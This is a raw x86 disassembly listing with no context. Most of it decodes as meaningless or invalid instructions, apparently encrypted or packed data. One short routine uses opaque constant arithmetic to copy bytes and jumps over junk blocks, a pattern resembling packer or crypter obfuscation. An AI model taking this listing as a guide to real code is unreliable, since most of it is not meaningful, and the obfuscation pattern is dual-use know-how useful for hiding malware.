  4150c7:	adc    eax,0x14fae4cc
  4150cc:	add    BYTE PTR [edi],al
  4150ce:	pop    ds
  4150cf:	mov    cl,0xc
  4150d1:	xchg   esi,eax
  4150d2:	leave  
  4150d3:	jne    0x4150f9
  4150d5:	je     0x4150bf
  4150d7:	mul    BYTE PTR [edx-0xea25cb9]
  4150dd:	repnz imul esp,DWORD PTR [ebx],0x9b4649b9
  4150e4:	mov    dl,0x9a
  4150e6:	add    esp,esp
  4150e8:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4150ea:	loop   0x415118
  4150ec:	lds    esp,FWORD PTR [ebp-0x37]
  4150ef:	arpl   WORD PTR [esi+eiz*2-0x80],dx
  4150f3:	ins    DWORD PTR es:[edi],dx
  4150f4:	mov    ss,WORD PTR [ebp+ecx*8+0x2af45913]
  4150fb:	jae    0x4150e8
  4150fd:	add    eax,DWORD PTR [edi]
  4150ff:	add    ch,BYTE PTR [ecx]
  415101:	retf   
  415102:	jle    0x415145
  415104:	imul   edx,ebp,0x27
  415107:	xchg   esi,eax
  415108:	shl    BYTE PTR [esp+edi*4],cl
  41510b:	sbb    DWORD PTR [ebp+0x74],esp
  41510e:	ds out dx,eax
  415110:	repnz ins BYTE PTR es:[edi],dx
  415112:	shr    BYTE PTR [ecx],1
  415114:	cli    
  415115:	in     eax,0xce
  415117:	bound  esp,QWORD PTR [esi]
  415119:	in     al,0x40
  41511b:	mov    bl,0x4
  41511d:	loope  0x415198
  41511f:	push   ebx
  415120:	mov    esi,0xc5627978
  415125:	or     eax,0xa1976919
  41512a:	and    dl,ch
  41512c:	iret   
  41512d:	shr    BYTE PTR ds:0x2f2ba6d6,1
  415133:	cmp    eax,0x31fc8672
  415138:	mov    al,ds:0x8c71a38f
  41513d:	int    0x6d
  41513f:	add    DWORD PTR [edx-0x6a],ebp
  415142:	fs mov cl,0xd0
  415145:	push   esp
  415146:	dec    DWORD PTR [edi-0x17]
  415149:	aam    0x21
  41514b:	jne    0x4151b2
  41514d:	rcl    eax,cl
  41514f:	lock out 0x97,eax
  415152:	fcom   DWORD PTR [ecx+0x37f7b17a]
  415158:	sub    DWORD PTR [esi+0x45252028],eax
  41515e:	addr16 sahf 
  415160:	jl     0x415154
  415162:	mov    dh,0x7
  415164:	pop    edx
  415165:	and    al,ch
  415167:	jmp    0x415174
  415169:	call   0xb9f5:0x66114c5f
  415170:	xlat   BYTE PTR ds:[ebx]
  415171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415172:	xchg   esp,eax
  415173:	inc    edi
  415174:	pop    eax
  415175:	lock and eax,0x9d6837c
  41517b:	adc    dl,dh
  41517d:	loope  0x41511c
  41517f:	pusha  
  415180:	push   0x7badd955
  415185:	sub    BYTE PTR [edx],dl
  415187:	mov    ds:0x59d0255b,eax
  41518c:	fmulp  st(3),st
  41518e:	or     al,dl
  415190:	fist   WORD PTR ds:0x5594472c
  415196:	stc    
  415197:	sub    BYTE PTR [edi-0x7b],bh
  41519a:	dec    ebp
  41519b:	sub    al,0xc6
  41519d:	pop    ebp
  41519e:	loop   0x415195
  4151a0:	push   eax
  4151a1:	aaa    
  4151a2:	mov    es,WORD PTR [edi+0x2be9c348]
  4151a8:	jle    0x415168
  4151aa:	test   ebx,ecx
  4151ac:	rcr    BYTE PTR ds:0xbe9acea7,1
  4151b2:	mov    ch,0xbb
  4151b4:	pop    esi
  4151b5:	test   al,0x7
  4151b7:	add    eax,0xbe6e6e0c
  4151bc:	(bad)  
  4151be:	mov    eax,0xa0253b17
  4151c3:	xor    eax,0x88080d7c
  4151c8:	test   BYTE PTR [edi-0x45],dh
  4151cb:	es retf 0xc97
  4151cf:	jmp    0x4151d4
  4151d1:	repnz inc ebx
  4151d3:	les    ecx,FWORD PTR [ebx+0x29142454]
  4151d9:	or     BYTE PTR [ecx],bl
  4151db:	push   eax
  4151dc:	add    al,0x8b
  4151de:	inc    esp
  4151df:	and    al,0xc
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi-0x4981e474]
  415305:	mov    ch,0x2b
  415307:	mov    esi,0x18160ebc
  41530c:	mov    ch,0x12
  41530e:	sbb    BYTE PTR [eax],bl
  415310:	dec    ecx
  415311:	jno    0x415377
  415313:	neg    BYTE PTR [esi-0x66d9b882]
  415319:	or     eax,0x1357bea2
  41531e:	clc    
  41531f:	mov    cl,0xe
  415321:	pop    edx
  415322:	pusha  
  415323:	popa   
  415324:	outs   dx,BYTE PTR es:[esi]
  415326:	add    DWORD PTR [edx-0x6d],ecx
  415329:	sti    
  41532a:	aad    0x16
  41532c:	ds jmp 0x4152ba
  41532f:	adc    BYTE PTR [edx],bl
  415331:	lds    esp,FWORD PTR [edx-0x35]
  415334:	adc    bh,cl
  415336:	sbb    al,0xc7
  415338:	sbb    eax,DWORD PTR [edi]
  41533a:	xchg   edi,eax
  41533b:	neg    DWORD PTR [eax]
  41533d:	inc    ebp
  41533e:	jl     0x415397
  415340:	(bad)  
  415341:	retf   0xb1dc
  415344:	icebp  
  415345:	imul   eax,DWORD PTR [edx+0x72],0xffffffcf
  415349:	pextrw eax,(bad),0xc5
  41534b:	add    BYTE PTR [ecx+0x1839145f],al
  415351:	(bad)  
  415352:	adc    DWORD PTR [edx],ebx
  415354:	popf   
  415355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415356:	rcl    BYTE PTR [ebx+0x45],1
  415359:	xor    eax,0xdef34656
  41535e:	(bad)  
  41535f:	push   0xa81615fa
  415364:	aaa    
  415365:	xchg   BYTE PTR [ebp+0x545f5f4b],bl
  41536b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41536c:	jg     0x4152f5
  41536e:	das    
  41536f:	mov    DWORD PTR ds:0x2c347a9d,eax
  415375:	retf   
  415376:	(bad)  
  415378:	or     BYTE PTR ds:0x5036f4fb,cl
  41537e:	mov    BYTE PTR [esi+esi*8+0x79125062],ch
  415385:	xchg   esi,eax
  415386:	push   eax
  415387:	sub    edi,DWORD PTR [ebp-0x1637f4c0]
  41538d:	iret   
  41538e:	xchg   esp,eax
  41538f:	outs   dx,DWORD PTR ds:[esi]
  415390:	test   al,0xab
  415392:	clc    
  415393:	(bad)  
  415394:	dec    ebp
  415395:	fs (bad) 
  415398:	pop    esi
  415399:	jno    0x415341
  41539b:	add    eax,0x6ec2421e
  4153a0:	xor    ch,bh
  4153a2:	mov    esp,edx
  4153a4:	rol    BYTE PTR [ecx],cl
  4153a6:	push   ebp
  4153a7:	jecxz  0x41537e
  4153a9:	push   eax
  4153aa:	inc    edx
  4153ab:	popa   
  4153ac:	icebp  
  4153ad:	adc    dl,ch
  4153af:	sub    DWORD PTR [ecx+0x5c],edi
  4153b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b3:	jl     0x4153dd
  4153b5:	rcl    BYTE PTR [edi+edx*4+0x75c90083],0x54
  4153bd:	jnp    0x415391
  4153bf:	push   edi
  4153c0:	ret    
  4153c1:	jge    0x4153bc
  4153c3:	or     cl,ah
  4153c5:	mov    ebx,0xa244b4fa
  4153ca:	pop    esp
  4153cb:	jl     0x4153ee
  4153cd:	jnp    0x415442
  4153cf:	pop    eax
  4153d0:	inc    ebp
  4153d1:	push   edx
  4153d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153d3:	bound  esi,QWORD PTR [edi-0x33582f90]
  4153d9:	push   ds
  4153da:	es xchg esp,eax
  4153dc:	dec    esi
  4153dd:	mov    ?,WORD PTR [edi-0x35]
  4153e0:	cld    
  4153e1:	scas   eax,DWORD PTR es:[edi]
  4153e2:	hlt    
  4153e3:	es jb  0x415443
  4153e6:	add    esi,DWORD PTR [ebx+ebp*1+0x688bb528]
  4153ed:	add    esp,DWORD PTR [ebx]
  4153ef:	and    eax,0x4c3aaafa
  4153f4:	(bad)  
  4153f5:	jns    0x415423
  4153f7:	in     al,0xa8
  4153f9:	loopne 0x4153f5
  4153fb:	outs   dx,DWORD PTR ds:[esi]
  4153fc:	daa    
  4153fd:	ret    
  4153fe:	jg     0x4153a9
  415400:	mov    di,WORD PTR [edx]
  415403:	daa    
  415404:	dec    eax
  415405:	jge    0x41545d
  415407:	mov    eax,ds:0xee66864d
  41540c:	sar    DWORD PTR [edi],0x87
  41540f:	(bad)  
  415410:	fcom   QWORD PTR [esi+0x305c0b21]
  415416:	inc    edx
  415417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415419:	inc    eax
  41541a:	aaa    
  41541b:	es ss mov esi,0x50a2f54a
  415422:	fsub   DWORD PTR [ecx-0x53631d0b]
  415428:	sti    
  415429:	cmp    edi,DWORD PTR [edx-0x2cb88744]
  41542f:	or     BYTE PTR [edx],al
  415431:	jb     0x415463
  415433:	or     edi,eax
  415435:	fsubr  st(2),st
  415437:	cmp    DWORD PTR [ebx+0x2cb5920d],esp
  41543d:	xor    eax,0x76fdc5ec
  415442:	inc    edx
  415443:	sbb    al,0xce
  415445:	outs   dx,DWORD PTR ds:[esi]
  415446:	mov    dh,0x9d
  415448:	xchg   ecx,eax
  415449:	and    DWORD PTR [edx+0x7e],eax
  41544c:	push   ds
  41544d:	fcmovnbe st,st(5)
  41544f:	jle    0x4154b0
  415451:	inc    ecx
  415452:	fistp  DWORD PTR [ebx-0x2c]
  415455:	mov    ds,WORD PTR [ebx]
  415457:	outs   dx,BYTE PTR ds:[esi]
  415458:	sbb    BYTE PTR [edx+ebx*2],dl
  41545b:	fld    TBYTE PTR [edi]
  41545d:	jg     0x41546b
  41545f:	jecxz  0x41546f
  415461:	mov    ds:0x1280c320,al
  415466:	push   es
  415467:	cmp    esi,DWORD PTR [ecx]
  415469:	shr    DWORD PTR [ebp+0x373312a5],cl
  41546f:	inc    ebp
  415470:	pop    ecx
  415471:	outs   dx,DWORD PTR ds:[esi]
  415472:	pop    ss
  415473:	sti    
  415474:	pop    es
  415475:	pop    ecx
  415476:	jmp    0x7ec4dfa3
  41547b:	push   0xffffffff
  41547d:	jns    0x415449
  41547f:	retf   
  415480:	dec    ecx
  415481:	push   ebx
  415482:	dec    eax
  415483:	enter  0x7d55,0x33
  415487:	add    esi,DWORD PTR [esi-0x11]
  41548a:	add    eax,0xc4430d29
  41548f:	pop    esi
  415490:	std    
  415491:	popa   
  415492:	sbb    ebp,edx
  415494:	cmp    BYTE PTR [edx-0x7d9cbef5],bl
  41549a:	pop    edx
  41549b:	cmp    bl,BYTE PTR [ecx-0x54]
  41549e:	sub    DWORD PTR [ebp+0x7a],edi
  4154a1:	pop    ebp
  4154a2:	jns    0x4154a6
  4154a4:	sub    esi,ebx
  4154a6:	jp     0x415494
  4154a8:	xchg   ebp,eax
  4154a9:	lahf   
  4154aa:	push   ebp
  4154ab:	or     al,cl
  4154ad:	mov    bl,0xb
  4154af:	dec    esp
  4154b0:	xchg   ch,ch
  4154b2:	nop
  4154b3:	adc    bh,BYTE PTR [ebx-0x4]
  4154b6:	cmp    al,0xb6
  4154b8:	mul    BYTE PTR [edi+ebx*2-0xd]
  4154bc:	pop    edi
  4154bd:	icebp  
  4154be:	out    dx,al
  4154bf:	loopne 0x415495
  4154c1:	scas   eax,DWORD PTR es:[edi]
  4154c2:	or     ebx,DWORD PTR [edx+eax*4]
  4154c5:	or     cl,ah
  4154c7:	inc    edi
  4154c8:	mov    esp,0x7de8bc20
  4154cd:	imul   edx,edx,0xe283cbd9
  4154d3:	dec    DWORD PTR [ecx-0x6e]
  4154d6:	mov    bl,0x45
  4154d8:	aad    0xd2
  4154da:	repnz lea edx,ss:[esp+ecx*1-0x4]
  4154e0:	inc    ecx
  4154e1:	xchg   ecx,eax
  4154e2:	enter  0x1c08,0xe5
  4154e6:	das    
  4154e7:	call   0x2b5:0x77025d8f
  4154ee:	pop    ss
  4154ef:	pop    eax
  4154f0:	xchg   ecx,eax
  4154f1:	cmp    BYTE PTR [edx+0x74329a6],ah
  4154f7:	(bad)  
  4154f8:	and    DWORD PTR [edi+eax*1],eax
  4154fb:	int    0xdd
  4154fd:	mov    ah,0x92
  4154ff:	in     eax,dx
  415500:	sbb    ecx,0x1866e459
  415506:	push   ds
  415507:	and    dh,ch
  415509:	aad    0x67
  41550b:	imul   edx,DWORD PTR [ecx+0x5b],0xfffffffc
  41550f:	arpl   WORD PTR [edi-0x3],di
  415512:	nop
  415513:	addr16 fdivp st(4),st
  415516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415517:	sbb    dh,al
  415519:	xchg   esp,eax
  41551a:	outs   dx,DWORD PTR ds:[esi]
  41551b:	scas   eax,DWORD PTR es:[edi]
  41551c:	stos   BYTE PTR es:[edi],al
  41551d:	mov    BYTE PTR [eax+eiz*2-0x50491c64],dl
  415524:	xchg   BYTE PTR ds:0xe3de702c,al
  41552a:	dec    esp
  41552b:	aaa    
  41552c:	cmp    BYTE PTR [edx-0x35],bl
  41552f:	sti    
  415530:	inc    eax
  415531:	sub    cl,BYTE PTR [ebp-0x6d0369fd]
  415537:	pop    esi
  415538:	mov    al,0xb5
  41553a:	xor    al,0xa0
  41553c:	jmp    0xf79c:0x9bc89b6f
  415543:	fsub   st,st(7)
  415545:	stc    
  415546:	adc    BYTE PTR [ecx-0x6a],al
  415549:	jl     0x415566
  41554b:	test   DWORD PTR [eax-0x18ffd24b],0x2505b9a
  415555:	inc    ebx
  415556:	jmp    0x471d:0x9e6f555a
  41555d:	or     eax,0x7e08b974
  415562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415563:	je     0x4155d7
  415565:	pushf  
  415566:	mov    ah,0x42
  415568:	cmp    BYTE PTR [ebx+0x69],al
  41556b:	jge    0x415578
  41556d:	xchg   ebp,eax
  41556e:	xchg   DWORD PTR [edx+edx*1],esp
  415571:	sub    bl,dl
  415573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415575:	pop    edx
  415576:	call   0x3868:0xe926b9c8
  41557d:	ret    0x3b28
  415580:	adc    eax,0x4b8a0247
  415585:	(bad)  
  415586:	nop
  415587:	jp     0x41554a
  415589:	retf   0xd12a
  41558c:	out    dx,al
  41558d:	mov    edx,0x39f5f2de
  415592:	or     al,0x6
  415594:	jg     0x41557d
  415596:	pop    esp
  415597:	mov    esp,0x6e16c4a4
  41559c:	iret   
  41559d:	(bad)  
  41559e:	hlt    
  41559f:	cmpxchg DWORD PTR [esi+0xd7a5d4],eax
  4155a6:	pusha  
  4155a7:	xor    cl,BYTE PTR [edx+ebp*8+0x4315ce13]
  4155ae:	cmp    ch,0xd3
  4155b1:	ret    
  4155b2:	sbb    DWORD PTR [eax+0x14955e02],esp
  4155b8:	push   ebx
  4155b9:	and    DWORD PTR fs:[edx+0x5a],edx
  4155bd:	or     ebx,DWORD PTR [ebx+0x4f]
  4155c0:	repz cmp eax,0xe01c8602
  4155c6:	pop    esi
  4155c7:	push   0x5eaac2d6
  4155cc:	imul   BYTE PTR [edx]
  4155ce:	fwait
  4155cf:	ss pop ds
  4155d1:	into   
  4155d2:	xchg   BYTE PTR [ebx+0x6428625f],bh
  4155d8:	dec    ecx
  4155d9:	mov    ecx,0xbc29a8e6
  4155de:	and    bl,BYTE PTR [eax+eax*4-0x73]
  4155e2:	jmp    0x4155ef
  4155e4:	shl    cl,cl
  4155e6:	lahf   
  4155e7:	sbb    BYTE PTR [esi+0x41],0x2e
  4155eb:	adc    BYTE PTR [ebx],0x5b
  4155ee:	push   ds
  4155ef:	imul   BYTE PTR [edx+eax*2+0x52e83e71]
  4155f6:	push   ss
  4155f7:	sub    ch,dh
  4155f9:	popa   
  4155fa:	imul   esp,DWORD PTR [esi+ecx*2-0x683a1613],0x131c6bcb
  415605:	dec    ecx
  415606:	lods   al,BYTE PTR ds:[esi]
  415607:	xor    al,dl
  415609:	retf   
  41560a:	xchg   ebx,eax
  41560b:	jnp    0x41563a
  41560d:	mov    ah,0xb4
  41560f:	mov    al,ds:0x60fd2db1
  415614:	(bad)  
  415615:	scas   al,BYTE PTR es:[edi]
  415616:	push   cs
  415617:	inc    eax
  415618:	add    DWORD PTR [eax],edx
  41561a:	hlt    
  41561b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41561c:	retf   0x5cb9
  41561f:	iret   
  415620:	ins    BYTE PTR es:[edi],dx
  415621:	mov    esi,0x3a3cb7da
  415626:	sub    BYTE PTR [esi+0x4b1e576d],al
  41562c:	push   esi
  41562d:	adc    bl,BYTE PTR [ecx+0x60]
  415630:	adc    esp,DWORD PTR [eax-0x29fc197b]
  415636:	jo     0x415660
  415638:	cmc    
  415639:	add    al,0x86
  41563b:	cmp    esi,DWORD PTR [esi+edi*8-0x26]
  41563f:	out    dx,ax
  415641:	mov    al,0xa2
  415643:	sbb    al,0x1d
  415646:	mov    eax,DWORD PTR [ebp-0x10]
  415649:	mov    edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x415634
  41567f:	cli    
  415680:	mov    ch,0x7c
  415682:	pop    eax
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp+0x4f181812],dh
  41568b:	aam    0x7c
  41568d:	loopne 0x415642
  41568f:	sar    DWORD PTR [ebx+0x6db74516],0xce
  415696:	push   0xfffffff9
  415698:	mov    eax,ds:0x87fb1ed7
  41569d:	mov    fs,WORD PTR [ecx+0x45e62a63]
  4156a3:	dec    ebp
  4156a4:	sub    BYTE PTR [edi-0x1b],dh
  4156a7:	fst    DWORD PTR [ecx]
  4156a9:	imul   ebx,DWORD PTR [edi],0x2c
  4156ac:	jb     0x415692
  4156ae:	loope  0x415669
  4156b0:	sub    eax,0x288b77ba
  4156b5:	scas   al,BYTE PTR es:[edi]
  4156b6:	js     0x4156d9
  4156b8:	xor    al,0xfa
  4156ba:	and    bh,bl
  4156bc:	jle    0x41570d
  4156be:	and    ah,al
  4156c0:	ins    BYTE PTR es:[edi],dx
  4156c1:	aaa    
  4156c2:	pop    ss
  4156c3:	jl     0x41565d
  4156c5:	ds xchg edi,eax
  4156c7:	mov    BYTE PTR [esi],ch
  4156c9:	jp     0x4156d9
  4156cb:	jns    0x41572b
  4156cd:	or     al,0xf7
  4156cf:	mov    ds:0x6fe252fe,al
  4156d4:	retf   
  4156d5:	sbb    al,BYTE PTR [eax+0x2b283a2]
  4156db:	sti    
  4156dc:	test   ebp,0x991bcf45
  4156e2:	mov    ds:0x766bed23,eax
  4156e7:	aad    0x7f
  4156e9:	enter  0x847e,0x59
  4156ed:	aad    0x7a
  4156ef:	mov    dl,0x44
  4156f1:	jno    0x4156c2
  4156f3:	cmp    DWORD PTR [edi],ecx
  4156f5:	out    dx,eax
  4156f6:	fucomp st(0)
  4156f8:	fmulp  st(0),st
  4156fb:	dec    bh
  4156fd:	adc    eax,0x3a2b7704
  415702:	mov    ebx,0xa4e55d7c
  415707:	scas   al,BYTE PTR es:[edi]
  415708:	ret    0xd175
  41570b:	inc    ebp
  41570c:	push   ds
  41570d:	sahf   
  41570e:	pop    ebp
  41570f:	fisttp WORD PTR [ecx+0x63c88341]
  415715:	and    edi,DWORD PTR [ecx-0xd]
  415718:	std    
  415719:	mov    ah,0x74
  41571b:	hlt    
  41571c:	(bad)  
  41571d:	mov    ds:0x19d993b9,eax
  415722:	imul   ebx,ebx,0x2a
  415725:	mov    WORD PTR [ebp+0x719f43a4],?
  41572b:	cmp    DWORD PTR gs:[esi-0x114aa249],0x3c327e33
  415736:	add    ecx,DWORD PTR [ecx+eax*4+0x39506fbb]
  41573d:	mov    cl,0x53
  41573f:	cmp    DWORD PTR [edi-0x65],ebx
  415742:	ret    
  415743:	addr16 (bad) 
  415745:	data16 aaa 
  415747:	mov    ah,0x64
  415749:	arpl   WORD PTR [ebx+0x5d],si
  41574c:	cmp    BYTE PTR [edx-0x577662ca],ah
  415752:	mov    dh,0xfa
  415754:	test   dh,al
  415756:	mov    gs,WORD PTR [ecx+esi*1+0x7dd0443f]
  41575d:	out    dx,eax
  41575e:	adc    al,0x85
  415760:	push   edi
  415761:	inc    ecx
  415762:	xor    al,0x80
  415764:	mov    ds:0xfa6cd2f9,al
  415769:	imul   esp,DWORD PTR [ebx],0x49
  41576c:	adc    edi,DWORD PTR [esi]
  41576e:	(bad)  
  41576f:	inc    DWORD PTR [esi]
  415771:	jbe    0x415757
  415773:	pop    ss
  415774:	xlat   BYTE PTR ds:[ebx]
  415775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415776:	sbb    al,0x59
  415778:	jmp    0x8686:0x51115846
  41577f:	xor    DWORD PTR ds:0xe137266b,ebx
  415785:	jge    0x415740
  415787:	or     ecx,esi
  415789:	sbb    al,0x48
  41578b:	int3   
  41578c:	mov    dh,0xd8
  41578e:	mov    ch,0x58
  415790:	pop    esp
  415791:	daa    
  415792:	aam    0x18
  415794:	inc    ecx
  415795:	stos   BYTE PTR es:[edi],al
  415796:	add    eax,0x598b0cb8
  41579b:	jno    0x4157fe
  41579d:	jmp    0x8493:0x17ff8c9c
  4157a4:	icebp  
  4157a5:	dec    eax
  4157a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157a7:	mov    edi,0x2b386f74
  4157ac:	or     ch,dl
  4157ae:	mov    eax,0x66d74e1c
  4157b3:	pusha  
  4157b4:	aad    0x8b
  4157b6:	jne    0x415771
  4157b8:	in     eax,dx
  4157b9:	jnp    0x4157d5
  4157bb:	dec    edi
  4157bc:	rcr    DWORD PTR [esi],0x9d
  4157bf:	push   edx
  4157c0:	adc    edi,ebp
  4157c2:	je     0x41577a
  4157c4:	in     eax,dx
  4157c5:	jno    0x4157f0
  4157c7:	dec    edx
  4157c8:	add    DWORD PTR [edx],eax
  4157ca:	or     eax,0xe379027f
  4157cf:	iret   
  4157d0:	test   al,0x8d
  4157d2:	inc    edi
  4157d3:	das    
  4157d4:	(bad)  
  4157d5:	mov    al,ds:0x1103f12e
  4157da:	jecxz  0x4157dc
  4157dc:	add    ch,BYTE PTR [edx-0x6474577f]
  4157e2:	or     DWORD PTR [ecx+0x7a2831a3],0x879d7116
  4157ec:	or     edi,DWORD PTR [ecx-0xa291252]
  4157f2:	mov    esi,0x1ff80bc1
  4157f7:	call   FWORD PTR [ecx]
  4157f9:	push   esp
  4157fa:	mov    ch,bh
  4157fc:	pop    ebp
  4157fd:	push   0x7d33f8b8
  415802:	push   edi
  415803:	sub    DWORD PTR [eax],ebp
  415805:	or     al,0xd4
  415807:	mov    esi,DWORD PTR [ebp+0x4]
  41580a:	push   edx
  41580b:	scas   eax,DWORD PTR es:[edi]
  41580c:	mov    DWORD PTR [esi+0x5d],eax
  41580f:	cdq    
  415810:	sub    al,0x4a
  415812:	mov    cl,0xfe
  415814:	cli    
  415815:	pop    ebp
  415816:	adc    al,0xf
  415818:	sbb    eax,0xaec6d77a
  41581d:	cmp    eax,0x5ccc0138
  415822:	adc    eax,0xae3be593
  415827:	add    esi,DWORD PTR [edi-0x6d]
  41582a:	rol    BYTE PTR ds:0x367be430,cl
  415830:	scas   eax,DWORD PTR es:[edi]
  415831:	mov    dh,0x51
  415833:	(bad)  
  415834:	mov    al,0x16
  415836:	inc    esp
  415837:	mov    bh,0xf2
  415839:	or     dl,al
  41583b:	jb     0x415883
  41583d:	add    cl,bl
  41583f:	fistp  DWORD PTR [edi+0x721178d8]
  415845:	sbb    eax,0x77f397db
  41584a:	jae    0x4158b8
  41584c:	xchg   edx,eax
  41584d:	xchg   edi,eax
  41584e:	stos   BYTE PTR es:[edi],al
  41584f:	outs   dx,DWORD PTR ds:[esi]
  415850:	hlt    
  415851:	pop    edx
  415852:	adc    BYTE PTR [ebp-0x2],dh
  415855:	cli    
  415856:	in     al,0x10
  415858:	clc    
  415859:	or     eax,DWORD PTR [edi+0xe]
  41585c:	dec    esp
  41585d:	das    
  41585e:	out    dx,al
  41585f:	dec    ecx
  415860:	adc    ebx,edx
  415862:	stos   BYTE PTR es:[edi],al
  415863:	jno    0x4157ec
  415865:	inc    edi
  415866:	loope  0x415880
  415868:	xor    ebp,edx
  41586a:	add    DWORD PTR [ecx+0x56],esi
  41586d:	lods   al,BYTE PTR ds:[esi]
  41586e:	mov    dl,0xce
  415870:	fnstenv [edx-0x3e39ad97]
  415876:	add    al,0x1a
  415878:	xor    BYTE PTR [edi],al
  41587a:	test   BYTE PTR [edi+eiz*8+0x50],dl
  41587e:	push   0x5b
  415880:	outs   dx,BYTE PTR ds:[esi]
  415881:	adc    esi,DWORD PTR [ecx+0x18c6323b]
  415887:	fs xchg ebp,eax
  415889:	gs push edx
  41588b:	mov    bl,0x81
  41588d:	dec    ecx
  41588e:	shl    DWORD PTR ds:0xaf16819f,1
  415894:	retf   
  415895:	ds pop ds
  415897:	add    al,0x6e
  415899:	jae    0x4158ba
  41589b:	sub    eax,0x463d28d0
  4158a0:	jo     0x41589e
  4158a2:	mov    DWORD PTR [ebp-0x7a],ebp
  4158a5:	mov    ebx,0x302d6453
  4158aa:	not    DWORD PTR [ebx]
  4158ac:	add    BYTE PTR [edx+0x29],cl
  4158af:	fstp   QWORD PTR [ecx-0x5e]
  4158b2:	add    edx,esi
  4158b4:	pop    edx
  4158b5:	adc    ebx,DWORD PTR [ebp+0x1f0446ea]
  4158bb:	call   0xe3d7b67
  4158c0:	jg     0x415875
  4158c2:	mov    bl,0xd5
  4158c4:	cmc    
  4158c5:	pop    ss
  4158c6:	mov    DWORD PTR [edx],ecx
  4158c8:	js     0x415890
  4158ca:	xchg   ebp,esp
  4158cc:	pop    esp
  4158cd:	push   esi
  4158ce:	or     al,0x3d
  4158d0:	xchg   edx,eax
  4158d1:	jl     0x4158e9
